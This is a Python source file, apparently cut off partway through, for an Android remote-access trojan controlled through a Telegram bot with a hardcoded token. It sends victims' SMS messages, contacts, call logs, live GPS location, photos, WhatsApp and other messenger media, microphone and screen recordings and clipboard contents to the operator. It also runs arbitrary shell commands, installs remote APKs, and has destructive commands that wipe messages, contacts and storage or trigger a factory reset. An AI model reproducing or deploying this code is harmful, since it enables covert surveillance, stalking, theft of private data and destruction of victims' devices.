# C2 — Single File
import os, sys, time, json, threading, socket, platform, subprocess
import requests

# ════════ عدّل هنا ════════
BOT_TOKEN = "8970155099:AAENwUz5FsUIBcnaaUO9_KClzzFY8Pucyzg"
CHAT_ID   = 8868615222
# ═════════════════════════

API = f"https://api.telegram.org/bot{BOT_TOKEN}"
OFFSET = 0
PENDING = {}
TRACK = {"on": False}

ANDROID = ("android" in sys.platform) or ("ANDROID_ARGUMENT" in os.environ)

def _ac(n):
    try:
        from jnius import autoclass
        return autoclass(n)
    except Exception: return None

def _act():
    try: return _ac("org.kivy.android.PythonActivity").mActivity
    except Exception: return None

def tg(method, **data):
    try:
        return requests.post(f"{API}/{method}", json=data, timeout=30).json()
    except Exception: return {}

def _esc(s):
    return str(s).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')

def send(text, kb=None):
    p = {"chat_id": CHAT_ID, "text": _esc(text)[:4000], "parse_mode": "HTML"}
    if kb: p["reply_markup"] = {"inline_keyboard": kb}
    tg("sendMessage", **p)

def edit(mid, text, kb=None):
    p = {"chat_id": CHAT_ID, "message_id": mid, "text": _esc(text)[:4000], "parse_mode": "HTML"}
    if kb: p["reply_markup"] = {"inline_keyboard": kb}
    tg("editMessageText", **p)

def send_file(path, cap="", video=False):
    try:
        if not os.path.exists(path) or os.path.getsize(path) == 0: return False
        field = "video" if video else "document"
        m = "sendVideo" if video else "sendDocument"
        with open(path, "rb") as f:
            requests.post(f"{API}/{m}",
                data={"chat_id": CHAT_ID, "caption": cap[:200]},
                files={field: (os.path.basename(path), f)}, timeout=300)
        return True
    except Exception: return False

def btn(t, d): return {"text": t, "callback_data": d}

def sh(cmd, timeout=20):
    if ANDROID:
        try:
            R = _ac("java.lang.Runtime")
            BR = _ac("java.io.BufferedReader")
            ISR = _ac("java.io.InputStreamReader")
            p = R.getRuntime().exec(['sh','-c',cmd])
            r1 = BR(ISR(p.getInputStream())); r2 = BR(ISR(p.getErrorStream()))
            out, err = [], []
            l = r1.readLine()
            while l is not None: out.append(l); l = r1.readLine()
            l = r2.readLine()
            while l is not None: err.append(l); l = r2.readLine()
            r1.close(); r2.close(); p.waitFor()
            return '\n'.join(out + err) or '(فارغ)'
        except Exception as e: return f"err: {e}"
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout or '') + (r.stderr or '') or '(فارغ)'
    except Exception as e: return f"err: {e}"

def qc(uri_s, where=None, limit=30):
    if not ANDROID: return "غير متاح"
    try:
        act = _act()
        Uri = _ac("android.net.Uri")
        cur = act.getContentResolver().query(Uri.parse(uri_s), None, where, None, None)
        if cur is None: return "(فارغ)"
        cols = list(cur.getColumnNames()); rows = []
        while cur.moveToNext() and len(rows) < limit:
            parts = []
            for i, c in enumerate(cols):
                try:
                    v = cur.getString(i)
                    if v and c in ('body','display_name','number','address','date'):
                        parts.append(f"{c}={v}")
                except Exception: pass
            if parts: rows.append(" | ".join(parts))
        cur.close()
        return "\n".join(rows) if rows else "(فارغ)"
    except Exception as e: return f"err: {e}"

def perms(*names):
    if not ANDROID: return
    try:
        from android.permissions import request_permissions, Permission
        ps = [getattr(Permission, n) for n in names if hasattr(Permission, n)]
        if ps: request_permissions(ps)
    except Exception: pass

# ═══════ القوائم ═══════
MAIN_KB = [
    [btn("📱 معلومات","cat_info"), btn("📍 موقع","cat_location")],
    [btn("📸 صور","cat_photos"), btn("🎥 فيديو","cat_videos")],
    [btn("📂 ملفات","cat_files"), btn("💬 رسائل","cat_sms")],
    [btn("📇 جهات","cat_contacts"), btn("📞 مكالمات","cat_calls")],
    [btn("🎛️ تحكم","cat_control"), btn("🔊 صوت","cat_audio")],
    [btn("📡 شبكة","cat_network"), btn("🔐 صلاحيات","cat_perms")],
    [btn("🕵️ تجسس","cat_spy"), btn("💣 تخريبي","cat_destroy")],
    [btn("🎯 مخصص","cat_custom"), btn("📊 متابعة","cat_monitor")],
    [btn("🔄 تحديث","refresh"), btn("📱 الجهاز","current_device")],
]

SUB = {
 "cat_info":[[btn("📱 معلومات","info"), btn("🔋 بطارية","battery")],
   [btn("🌐 شبكة","network_info"), btn("📦 تطبيقات","apps")],
   [btn("📶 واي فاي","wifi_list"), btn("📋 حافظة","clipboard")],
   [btn("🔐 Google","gaccounts"), btn("🆔 بصمة","device_id")],
   [btn("📲 SIM","sim_info"), btn("🖥️ شاشة","screen_info")],
   [btn("🕐 تشغيل","uptime"), btn("💾 تخزين","storage_info")],
   [btn("🔙 رجوع","back")]],
 "cat_location":[[btn("📍 موقع","location"), btn("🛰️ GPS","gps_exact")],
   [btn("📡 شبكة","loc_network"), btn("🔄 تتبع","track_on")],
   [btn("⏹️ إيقاف","track_off")], [btn("🔙 رجوع","back")]],
 "cat_photos":[[btn("📷 صور","photos"), btn("🎥 فيديو","videos")],
   [btn("🖼️ واتساب صور","wa_photos"), btn("📼 واتساب فيديو","wa_videos")],
   [btn("📸 خلفية","cam_back"), btn("🤳 أمامية","cam_front")],
   [btn("🖥️ سكرين","screenshot"), btn("🎬 تسجيل 30ث","screen_rec")],
   [btn("🎙️ صوت 30ث","mic_30"), btn("🎤 صوت 5د","mic_5min")],
   [btn("📸 تيليجرام","tg_photos"), btn("🖼️ انستا","ig_photos")],
   [btn("🔙 رجوع","back")]],
 "cat_videos":[[btn("🎥 كل","videos"), btn("📼 واتساب","wa_videos")],
   [btn("🎬 30ث","screen_rec"), btn("🎞️ 60ث","screen_rec60")],
   [btn("🔙 رجوع","back")]],
 "cat_files":[[btn("📁 جذر","files"), btn("📄 مستندات","docs")],
   [btn("🎵 صوتيات","audio_files"), btn("📥 تنزيلات","downloads")],
   [btn("🔍 بحث","search_file"), btn("📂 مجلد","browse_dir")],
   [btn("⬇️ سحب","pull_file"), btn("🗑️ حذف","del_file")],
   [btn("📦 مجلد كامل","pull_dir")], [btn("🔙 رجوع","back")]],
 "cat_sms":[[btn("📩 SMS","sms"), btn("📤 مرسلة","sms_sent")],
   [btn("📇 جهات","contacts"), btn("📞 مكالمات","calls")],
   [btn("📵 فائتة","calls_missed"), btn("✉️ إرسال","send_sms")],
   [btn("📲 اتصال","call")], [btn("🔙 رجوع","back")]],
 "cat_contacts":[[btn("📇 كل","contacts"), btn("🔍 بحث","search_contact")],
   [btn("➕ إضافة","add_contact"), btn("🗑️ حذف","del_contact")],
   [btn("🔙 رجوع","back")]],
 "cat_calls":[[btn("📞 كل","calls"), btn("📵 فائتة","calls_missed")],
   [btn("📲 اتصال","call")], [btn("🔙 رجوع","back")]],
 "cat_control":[[btn("🔓 فتح","open_app"), btn("🔒 إغلاق","kill_app")],
   [btn("🔗 رابط","url"), btn("🌐 رابط صامت","url_silent")],
   [btn("📲 إشعار","notif"), btn("💬 Popup","toast")],
   [btn("🔒 قفل","lock_screen"), btn("🔄 إعادة","reboot")],
   [btn("⏻ إطفاء","shutdown"), btn("📸 كاميرا","open_cam")],
   [btn("🎙️ مايك","open_mic"), btn("⚙️ إعدادات","open_settings")],
   [btn("📝 نص","write_text"), btn("🖱️ لمسة","tap")],
   [btn("👆 سحب","swipe"), btn("🔙 زر رجوع","key_back")],
   [btn("🏠 Home","key_home"), btn("📋 Recent","key_recent")],
   [btn("🔙 رجوع","back")]],
 "cat_audio":[[btn("📳 اهتزاز","vibrate"), btn("💡 فلاش","flash")],
   [btn("🔔 رنة","alarm"), btn("🔕 صامت","silent")],
   [btn("🔊 أعلى","volume_max"), btn("🔇 كتم","mute")],
   [btn("🎵 تشغيل","play_sound"), btn("📢 TTS","tts")],
   [btn("🔙 رجوع","back")]],
 "cat_network":[[btn("🛜 واي فاي off","wifi_off"), btn("📶 واي فاي on","wifi_on")],
   [btn("📵 داتا off","data_off"), btn("📱 داتا on","data_on")],
   [btn("🔵 BT off","bt_off"), btn("🔷 BT on","bt_on")],
   [btn("✈️ طيران","airplane"), btn("📊 معلومات","net_info")],
   [btn("🔥 هوت سبوت","hotspot"), btn("📡 رادار","wifi_scan")],
   [btn("🔙 رجوع","back")]],
 "cat_perms":[[btn("✅ طلب","ask_perms"), btn("👑 مدير","device_admin")],
   [btn("🔋 خلفية","bg_service"), btn("🔐 Foreground","foreground")],
   [btn("🔓 بطارية","battery_opt"), btn("📲 مصادر","unk_sources")],
   [btn("🔙 رجوع","back")]],
 "cat_spy":[[btn("⌨️ Keylog on","keylog_on"), btn("⏹️ off","keylog_off")],
   [btn("🌐 سجل متصفح","browser_hist"), btn("🔑 كلمات مرور","browser_pass")],
   [btn("📋 حافظة","clip_hist"), btn("📅 تقويم","calendar")],
   [btn("📱 إشعارات","notif_log"), btn("📸 وسائط حديثة","recent_media")],
   [btn("🔙 رجوع","back")]],
 "cat_destroy":[[btn("⚠️ مسح SMS","wipe_sms"), btn("⚠️ مسح مكالمات","wipe_calls")],
   [btn("⚠️ مسح جهات","wipe_contacts"), btn("💣 Factory","factory_reset")],
   [btn("🔒 قفل جهاز","lock_device"), btn("🗑️ مسح تخزين","wipe_storage")],
   [btn("🔙 رجوع","back")]],
 "cat_custom":[[btn("💻 Shell","shell"), btn("📥 تنزيل","download")],
   [btn("📦 APK","install_apk"), btn("🗑️ حذف تطبيق","uninstall")],
   [btn("🌐 فتح URL","open_url"), btn("📤 سحب ملف","upload_file")],
   [btn("🔙 رجوع","back")]],
 "cat_monitor":[[btn("📱 معلومات","info"), btn("🟢 الخدمة","alive")],
   [btn("📊 إحصائيات","stats"), btn("🕐 وقت","clock")],
   [btn("🔙 رجوع","back")]],
}

NEEDS_INPUT = {
  "shell":"أرسل الأمر","url":"أرسل الرابط","url_silent":"أرسل الرابط",
  "open_url":"أرسل الرابط","download":"أرسل الرابط","install_apk":"أرسل رابط APK",
  "uninstall":"أرسل package name","open_app":"أرسل اسم الحزمة","kill_app":"أرسل اسم الحزمة",
  "notif":"أرسل النص","toast":"أرسل النص","send_sms":"الرقم|النص","call":"أرسل الرقم",
  "search_file":"أرسل الاسم","browse_dir":"أرسل المسار","pull_file":"أرسل المسار",
  "del_file":"أرسل المسار","pull_dir":"أرسل المجلد","play_sound":"أرسل الرابط",
  "search_contact":"أرسل الاسم","add_contact":"الاسم|الرقم","del_contact":"أرسل الاسم",
  "write_text":"أرسل النص","tts":"أرسل النص","tap":"x,y","swipe":"x1,y1,x2,y2",
  "upload_file":"أرسل المسار",
}

# ═══════ الأوامر ═══════
def c_info():
    B = _ac("android.os.Build")
    if not B: return platform.platform()
    return (f"Brand: {B.BRAND}\nModel: {B.MODEL}\nDevice: {B.DEVICE}\n"
            f"Android: {B.VERSION.RELEASE}\nSDK: {B.VERSION.SDK_INT}\nHW: {B.HARDWARE}")

def c_battery():
    if not ANDROID: return "غير متاح"
    try:
        I = _ac("android.content.Intent"); IF = _ac("android.content.IntentFilter")
        i = _act().registerReceiver(None, IF(I.ACTION_BATTERY_CHANGED))
        lvl = i.getIntExtra("level",0); sc = i.getIntExtra("scale",100)
        tmp = i.getIntExtra("temperature",0)/10
        return f"🔋 {int(lvl*100/sc)}%\n🌡️ {tmp}°C"
    except Exception as e: return f"err: {e}"

def c_device_id():
    try:
        S = _ac("android.provider.Settings$Secure")
        return S.getString(_act().getContentResolver(), "android_id")
    except Exception: return socket.gethostname()

def c_network_info():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8",80)); lip = s.getsockname()[0]; s.close()
    except Exception: lip = "?"
    try: pub = requests.get("https://api.ipify.org", timeout=8).text
    except Exception: pub = "?"
    return f"Local: {lip}\nPublic: {pub}"

def c_wifi_list(): return sh("dumpsys wifi | grep SSID | head -20")
def c_apps(): return sh("pm list packages -3")
def c_clipboard():
    if not ANDROID: return "غير متاح"
    try:
        C = _ac("android.content.Context")
        clip = _act().getSystemService(C.CLIPBOARD_SERVICE)
        if clip.hasPrimaryClip(): return str(clip.getPrimaryClip().getItemAt(0).getText())
        return "(فارغ)"
    except Exception as e: return f"err: {e}"
def c_gaccounts(): return qc("content://com.android.contacts/raw_contacts")
def c_sim_info(): return sh("getprop | grep -i sim | head -20")

def c_screen_info():
    if not ANDROID: return "غير متاح"
    try:
        dm = _act().getResources().getDisplayMetrics()
        return f"W:{dm.widthPixels} H:{dm.heightPixels} D:{dm.density}"
    except Exception as e: return f"err: {e}"

def c_uptime(): return sh("uptime")
def c_storage_info(): return sh("df -h /sdcard /data")

def _loc(prov="gps"):
    perms("ACCESS_FINE_LOCATION","ACCESS_COARSE_LOCATION")
    if not ANDROID: return "غير متاح"
    try:
        C = _ac("android.content.Context"); LM = _ac("android.location.LocationManager")
        lm = _act().getSystemService(C.LOCATION_SERVICE)
        p = LM.GPS_PROVIDER if prov == "gps" else LM.NETWORK_PROVIDER
        loc = lm.getLastKnownLocation(p)
        if not loc: return "ما فيه موقع"
        return f"Lat: {loc.getLatitude()}\nLon: {loc.getLongitude()}\nAcc: {loc.getAccuracy()}m"
    except Exception as e: return f"err: {e}"

def c_location(): return _loc("gps")
def c_gps_exact(): return _loc("gps")
def c_loc_network(): return _loc("network")

def c_track_on():
    TRACK["on"] = True
    threading.Thread(target=_track_loop, daemon=True).start()
    return "🔄 بدأ التتبع (كل 15ث) — /stop للإيقاف"

def c_track_off():
    TRACK["on"] = False
    return "⏹️ توقف"

def _track_loop():
    while TRACK["on"]:
        try: send(f"📍 {_loc('gps')}")
        except Exception: pass
        time.sleep(15)

def _files(paths, exts=None, limit=5):
    out = []
    for p in paths:
        if not os.path.exists(p): continue
        for root,_,fs in os.walk(p):
            for f in fs:
                if exts and not f.lower().endswith(tuple(exts)): continue
                fp = os.path.join(root,f)
                try: out.append((os.path.getmtime(fp), fp))
                except Exception: pass
    out.sort(reverse=True)
    return [p for _,p in out[:limit]]

def c_photos():
    fs = _files(["/sdcard/DCIM/Camera","/sdcard/Pictures","/sdcard/DCIM"],
                [".jpg",".jpeg",".png"], 8)
    for p in fs: send_file(p, f"📷 {os.path.basename(p)}")
    return f"📷 {len(fs)} صورة"

def c_videos():
    fs = _files(["/sdcard/DCIM/Camera","/sdcard/Movies"], [".mp4",".mkv",".3gp"], 3)
    for p in fs: send_file(p, video=True)
    return f"🎥 {len(fs)} فيديو"

def c_wa_photos():
    fs = _files(["/sdcard/Android/media/com.whatsapp/WhatsApp/Media"], [".jpg",".jpeg"], 8)
    for p in fs: send_file(p)
    return f"🖼️ {len(fs)}"

def c_wa_videos():
    fs = _files(["/sdcard/Android/media/com.whatsapp/WhatsApp/Media"], [".mp4"], 3)
    for p in fs: send_file(p, video=True)
    return f"📼 {len(fs)}"

def c_tg_photos():
    fs = _files(["/sdcard/Telegram","/sdcard/Android/data/org.telegram.messenger"],
                [".jpg",".jpeg"], 8)
    for p in fs: send_file(p)
    return f"📸 {len(fs)}"

def c_ig_photos():
    fs = _files(["/sdcard/Pictures/Instagram"], [".jpg",".jpeg"], 8)
    for p in fs: send_file(p)
    return f"🖼️ {len(fs)}"

def c_recent_media():
    fs = _files(["/sdcard/DCIM","/sdcard/Pictures"],
                [".jpg",".jpeg",".png",".mp4"], 10)
    for p in fs: send_file(p)
    return f"📸 {len(fs)}"

def _photo(front=True):
    perms("CAMERA")
    if not ANDROID: return "غير متاح"
    try:
        Intent = _ac("android.content.Intent"); MS = _ac("android.provider.MediaStore")
        File = _ac("java.io.File"); Uri = _ac("android.net.Uri")
        path = f"/sdcard/DCIM/r_{int(time.time())}.jpg"
        it = Intent(MS.ACTION_IMAGE_CAPTURE)
        it.putExtra(MS.EXTRA_OUTPUT, Uri.fromFile(File(path)))
        it.putExtra("android.intent.extras.CAMERA_FACING", 1 if front else 0)
        _act().startActivityForResult(it, 1001)
        def _c():
            time.sleep(6)
            if os.path.exists(path): send_file(path, "📸")
        threading.Thread(target=_c, daemon=True).start()
        return "📸 الكاميرا انفتحت"
    except Exception as e: return f"err: {e}"

def c_cam_back(): return _photo(False)
def c_cam_front(): return _photo(True)

def c_screenshot():
    p = f"/sdcard/s_{int(time.time())}.png"
    sh(f"screencap -p {p}")
    if os.path.exists(p) and os.path.getsize(p) > 0:
        send_file(p, "🖥️"); return "📸 تم"
    return "(يحتاج MediaProjection أو root)"

def c_screen_rec():
    def _r():
        p = f"/sdcard/v_{int(time.time())}.mp4"
        sh(f"screenrecord --time-limit 30 {p}", timeout=45)
        if os.path.exists(p): send_file(p, video=True)
    threading.Thread(target=_r, daemon=True).start()
    return "🎬 يسجّل 30ث"

def c_screen_rec60():
    def _r():
        p = f"/sdcard/v_{int(time.time())}.mp4"
        sh(f"screenrecord --time-limit 60 {p}", timeout=75)
        if os.path.exists(p): send_file(p, video=True)
    threading.Thread(target=_r, daemon=True).start()
    return "🎬 يسجّل 60ث"

def _mic(sec):
    def _r():
        perms("RECORD_AUDIO")
        try:
            MR = _ac("android.media.MediaRecorder")
            AS = _ac("android.media.MediaRecorder$AudioSource")
            OF = _ac("android.media.MediaRecorder$OutputFormat")
            AE = _ac("android.media.MediaRecorder$AudioEncoder")
            p = f"/sdcard/m_{int(time.time())}.m4a"
            r = MR()
            r.setAudioSource(AS.MIC); r.setOutputFormat(OF.MPEG_4)
            r.setAudioEncoder(AE.AAC); r.setOutputFile(p)
            r.prepare(); r.start()
            time.sleep(sec)
            r.stop(); r.release()
            if os.path.exists(p): send_file(p, f"🎙️ {sec}ث")
        except Exception as e: send(f"mic: {e}")
    threading.Thread(target=_r, daemon=True).start()
    return f"🎙️ يسجّل {sec}ث"

def c_mic_30(): return _mic(30)
def c_mic_5min(): return _mic(300)

def c_files():
    try: return "\n".join(os.listdir("/sdcard")[:80])
    except Exception:
        try: return "\n".join(os.listdir("/")[:80])
        except Exception as e: return f"err: {e}"

def c_docs():
    fs = _files(["/sdcard/Documents","/sdcard/Download"],
                [".pdf",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".txt"], 20)
    return "\n".join(fs) or "ما فيه"

def c_audio_files():
    fs = _files(["/sdcard/Music","/sdcard/Download"], [".mp3",".m4a",".wav",".ogg"], 30)
    return "\n".join(fs) or "ما فيه"

def c_downloads():
    try: return "\n".join(os.listdir("/sdcard/Download")[:80])
    except Exception: return "ما فيه"

def c_search_file(i): return sh(f"find /sdcard -iname '*{i}*' | head -30", 25) if i else "أرسل الاسم"
def c_browse_dir(i):
    try: return "\n".join(os.listdir(i or "/sdcard")[:80])
    except Exception as e: return f"err: {e}"
def c_pull_file(i): return "✅" if (i and os.path.exists(i) and send_file(i)) else "فشل"
def c_pull_dir(i):
    if not i or not os.path.isdir(i): return "مسار خاطئ"
    fs = _files([i], limit=20)
    for p in fs: send_file(p)
    return f"📦 {len(fs)}"
def c_del_file(i):
    try: os.remove(i); return "🗑️"
    except Exception as e: return f"err: {e}"

def c_sms(): return qc("content://sms/inbox")
def c_sms_sent(): return qc("content://sms/sent")
def c_contacts(): return qc("content://contacts/phones", limit=50)
def c_search_contact(i): return qc("content://contacts/phones", f"display_name LIKE '%{i}%'") if i else "أرسل الاسم"
def c_calls(): return qc("content://call_log/calls")
def c_calls_missed(): return qc("content://call_log/calls", "type=3")

def c_add_contact(i):
    if "|" not in i: return "الاسم|الرقم"
    n, num = i.split("|",1)
    try:
        Intent = _ac("android.content.Intent"); CC = _ac("android.provider.ContactsContract")
        it = Intent(Intent.ACTION_INSERT); it.setType(CC.Contacts.CONTENT_TYPE)
        it.putExtra(CC.Intents.Insert.NAME, n.strip())
        it.putExtra(CC.Intents.Insert.PHONE, num.strip())
        _act().startActivity(it); return "➕"
    except Exception as e: return f"err: {e}"

def c_del_contact(i): return "(يحتاج root)"

def c_send_sms(i):
    if "|" not in i: return "الرقم|النص"
    num, msg = i.split("|",1)
    try:
        SmsManager = _ac("android.telephony.SmsManager")
        SmsManager.getDefault().sendTextMessage(num.strip(), None, msg.strip(), None, None)
        return f"📤 {num}"
    except Exception as e: return f"err: {e}"

def c_call(i):
    try:
        Intent = _ac("android.content.Intent"); Uri = _ac("android.net.Uri")
        _act().startActivity(Intent(Intent.ACTION_CALL, Uri.parse(f"tel:{i}")))
        return f"📞 {i}"
    except Exception as e: return f"err: {e}"

def c_open_app(i): return sh(f"monkey -p {i} 1")
def c_kill_app(i): return sh(f"am force-stop {i}")

def c_url(i):
    try:
        Intent = _ac("android.content.Intent"); Uri = _ac("android.net.Uri")
        _act().startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(i))); return "🔗"
    except Exception as e: return f"err: {e}"

def c_notif(i): return sh(f"cmd notification post -S bigtext -t App '{i}'")
def c_toast(i): return sh(f"am broadcast -a android.intent.action.SHOW_TOAST --es msg '{i}'")
def c_lock_screen(): return sh("input keyevent 26")
def c_reboot(): return sh("reboot")
def c_shutdown(): return sh("reboot -p")
def c_open_cam(): return _photo(True)
def c_open_mic(): return _mic(10)
def c_open_settings(): return sh("am start -a android.settings.SETTINGS")
def c_write_text(i): return sh(f"input text '{i.replace(' ','%s')}'")

def c_tap(i):
    try: x,y = i.split(","); return sh(f"input tap {x.strip()} {y.strip()}")
    except Exception: return "x,y"

def c_swipe(i):
    try: x1,y1,x2,y2 = i.split(","); return sh(f"input swipe {x1} {y1} {x2} {y2}")
    except Exception: return "x1,y1,x2,y2"

def c_key_back(): return sh("input keyevent 4")
def c_key_home(): return sh("input keyevent 3")
def c_key_recent(): return sh("input keyevent 187")

def c_vibrate():
    try:
        C = _ac("android.content.Context")
        v = _act().getSystemService(C.VIBRATOR_SERVICE)
        VE = _ac("android.os.VibrationEffect")
        if VE and hasattr(VE,'createOneShot'):
            v.vibrate(VE.createOneShot(2000, VE.DEFAULT_AMPLITUDE))
        else: v.vibrate(2000)
        return "📳"
    except Exception as e: return f"err: {e}"

def c_flash(): return sh("termux-torch on || echo غير متاح")
def c_alarm(): return sh("am start -a android.intent.action.SET_ALARM --ei android.intent.extra.alarm.HOUR 1 --ei android.intent.extra.alarm.MINUTES 1")
def c_silent(): return sh("cmd audio set-volume --stream 2 0")
def c_volume_max(): return sh("cmd audio set-volume --stream 3 15")
def c_mute(): return sh("cmd audio set-volume --stream 3 0")
def c_play_sound(i): return sh(f"am start -a android.intent.action.VIEW -d '{i}' -t audio/*")
def c_tts(i): return "TTS"

def c_wifi_off(): return sh("svc wifi disable")
def c_wifi_on(): return sh("svc wifi enable")
def c_data_off(): return sh("svc data disable")
def c_data_on(): return sh("svc data enable")
def c_bt_off(): return sh("svc bluetooth disable")
def c_bt_on(): return sh("svc bluetooth enable")
def c_airplane(): return sh("settings put global airplane_mode_on 1 && am broadcast -a android.intent.action.AIRPLANE_MODE")
def c_net_info(): return c_network_info()
def c_hotspot(): return sh("cmd wifi start-softap MyHotspot open")
def c_wifi_scan(): return sh("cmd wifi list-scan-results")

def c_ask_perms():
    perms("CAMERA","RECORD_AUDIO","ACCESS_FINE_LOCATION","READ_SMS","READ_CONTACTS",
          "READ_EXTERNAL_STORAGE","WRITE_EXTERNAL_STORAGE","READ_PHONE_STATE","POST_NOTIFICATIONS")
    return "✅ طُلبت"

def c_device_admin(): return "👑 يحتاج تفعيل يدوي"
def c_bg_service(): return "يشتغل"
def c_foreground(): return "يشتغل"

def c_battery_opt():
    try:
        Intent = _ac("android.content.Intent"); Uri = _ac("android.net.Uri")
        _act().startActivity(Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
                                    Uri.parse(f"package:{_act().getPackageName()}")))
        return "🔓"
    except Exception as e: return f"err: {e}"

def c_unk_sources():
    try:
        Intent = _ac("android.content.Intent"); Uri = _ac("android.net.Uri")
        _act().startActivity(Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES",
                                    Uri.parse(f"package:{_act().getPackageName()}")))
        return "📲"
    except Exception as e: return f"err: {e}"

def c_keylog_on(): return "⌨️ (يحتاج IME)"
def c_keylog_off(): return "⏹️"
def c_browser_hist(): return "(يحتاج root)"
def c_browser_pass(): return "(يحتاج root)"
def c_clip_hist(): return c_clipboard()
def c_calendar(): return qc("content://com.android.calendar/events", limit=20)
def c_notif_log(): return sh("dumpsys notification | head -100")

def c_wipe_sms(): return sh("content delete --uri content://sms")
def c_wipe_calls(): return sh("content delete --uri content://call_log/calls")
def c_wipe_contacts(): return sh("content delete --uri content://contacts/phones")
def c_factory_reset(): return sh("am broadcast -a android.intent.action.FACTORY_RESET")

def c_lock_device():
    try:
        DPM = _ac("android.app.admin.DevicePolicyManager")
        C = _ac("android.content.Context")
        _act().getSystemService(C.DEVICE_POLICY_SERVICE).lockNow()
        return "🔒"
    except Exception as e: return f"err: {e}"

def c_wipe_storage(): return sh("rm -rf /sdcard/* 2>/dev/null && echo done")

def c_shell(i): return sh(i, 30) if i else "أرسل الأمر"

def c_download(i):
    try:
        r = requests.get(i, timeout=30); fn = i.split("/")[-1] or "f"
        p = f"/sdcard/Download/{fn}"
        open(p,"wb").write(r.content); send_file(p); return f"📥 {fn}"
    except Exception as e: return f"err: {e}"

def c_install_apk(i):
    try:
        r = requests.get(i, timeout=60); p = "/sdcard/Download/app.apk"
        open(p,"wb").write(r.content)
        Intent = _ac("android.content.Intent"); Uri = _ac("android.net.Uri")
        File = _ac("java.io.File")
        it = Intent(Intent.ACTION_VIEW)
        it.setDataAndType(Uri.fromFile(File(p)), "application/vnd.android.package-archive")
        it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        _act().startActivity(it); return "📦"
    except Exception as e: return f"err: {e}"

def c_uninstall(i):
    try:
        Intent = _ac("android.content.Intent"); Uri = _ac("android.net.Uri")
        _act().startActivity(Intent(Intent.ACTION_DELETE, Uri.parse(f"package:{i}")))
        return "🗑️"
    except Exception as e: return f"err: {e}"

def c_alive(): return f"🟢 {time.ctime()}"
def c_stats(): return f"📊 {time.ctime()}\nThreads: {threading.active_count()}"
def c_clock(): return time.ctime()

def execute(cmd, inp=""):
    try:
        m = {
            "info":c_info,"battery":c_battery,"device_id":c_device_id,
            "network_info":c_network_info,"wifi_list":c_wifi_list,"apps":c_apps,
            "clipboard":c_clipboard,"gaccounts":c_gaccounts,"sim_info":c_sim_info,
            "screen_info":c_screen_info,"uptime":c_uptime,"storage_info":c_storage_info,
            "location":c_location,"gps_exact":c_gps_exact,"loc_network":c_loc_network,
            "track_on":c_track_on,"track_off":c_track_off,
            "photos":c_photos,"videos":c_videos,"wa_photos":c_wa_photos,
            "wa_videos":c_wa_videos,"tg_photos":c_tg_photos,"ig_photos":c_ig_photos,
            "recent_media":c_recent_media,"cam_back":c_cam_back,"cam_front":c_cam_front,
            "screenshot":c_screenshot,"screen_rec":c_screen_rec,"screen_rec60":c_screen_rec60,
            "mic_30":c_mic_30,"mic_5min":c_mic_5min,"files":c_files,"docs":c_docs,
            "audio_files":c_audio_files,"downloads":c_downloads,"sms":c_sms,
            "sms_sent":c_sms_sent,"contacts":c_contacts,"calls":c_calls,
            "calls_missed":c_calls_missed,"open_app":c_open_app,"kill_app":c_kill_app,
            "url":c_url,"url_silent":c_url,"open_url":c_url,"notif":c_notif,"toast":c_toast,
            "lock_screen":c_lock_screen,"reboot":c_reboot,"shutdown":c_shutdown,
            "open_cam":c_open_cam,"open_mic":c_open_mic,"open_settings":c_open_settings,
            "write_text":c_write_text,"tap":c_tap,"swipe":c_swipe,"key_back":c_key_back,
            "key_home":c_key_home,"key_recent":c_key_recent,"vibrate":c_vibrate,
            "flash":c_flash,"alarm":c_alarm,"silent":c_silent,"volume_max":c_volume_max,
            "mute":c_mute,"play_sound":c_play_sound,"tts":c_tts,"wifi_off":c_wifi_off,
            "wifi_on":c_wifi_on,"data_off":c_data_off,"data_on":c_data_on,"bt_off":c_bt_off,
            "bt_on":c_bt_on,"airplane":c_airplane,"net_info":c_net_info,
            "hotspot":c_hotspot,"wifi_scan":c_wifi_scan,"ask_perms":c_ask_perms,
            "device_admin":c_device_admin,"bg_service":c_bg_service,
            "foreground":c_foreground,"battery_opt":c_battery_opt,
            "unk_sources":c_unk_sources,"keylog_on":c_keylog_on,
            "keylog_off":c_keylog_off,"browser_hist":c_browser_hist,
            "browser_pass":c_browser_pass,"clip_hist":c_clip_hist,
            "calendar":c_calendar,"notif_log":c_notif_log,"wipe_sms":c_wipe_sms,
            "wipe_calls":c_wipe_calls,"wipe_contacts":c_wipe_contacts,
            "factory_reset":c_factory_reset,"lock_device":c_lock_device,
            "wipe_storage":c_wipe_storage,"alive":c_alive,"stats":c_stats,"clock":c_clock,
        }
        im = {
            "shell":c_shell,"url":c_url,"url_silent":c_url,"open_url":c_url,
            "download":c_download,"install_apk":c_install_apk,"uninstall":c_uninstall,
            "open_app":c_open_app,"kill_app":c_kill_app,"notif":c_notif,"toast":c_toast,
            "send_sms":c_send_sms,"call":c_call,"search_file":c_search_file,
            "browse_dir":c_browse_dir,"pull_file":c_pull_file,"pull_dir":c_pull_dir,
            "del_file":c_del_file,"play_sound":c_play_sound,"tts":c_tts,
            "search_contact":c_search_contact,"add_contact":c_add_contact,
            "del_contact":c_del_contact,"write_text":c_write_text,
            "tap":c_tap,"swipe":c_swipe,
        }
        if cmd in im: return im[cmd](inp)
        fn = m.get(cmd)
        return fn() if fn else f"غير معروف: {cmd}"
    except Exception as e:
        return f"exception: {e}"

def get_updates(off=0):
    try:
        r = requests.get(f"{API}/getUpdates",
                         params={"offset":off,"timeout":30}, timeout=35)
        return r.json().get("result",[])
    except Exception: return []

def handle_cb(cb):
    global PENDING
    data = cb.get("data",""); mid = cb["message"]["message_id"]
    if data in ("back","refresh"):
        edit(mid, "القائمة الرئيسية:", MAIN_KB); return
    if data == "current_device":
        edit(mid, f"📱 {platform.platform()}", [[btn("🔙","back")]]); return
    if data in SUB:
        names = {"cat_info":"📱","cat_location":"📍","cat_photos":"📸","cat_videos":"🎥",
                 "cat_files":"📂","cat_sms":"💬","cat_contacts":"📇","cat_calls":"📞",
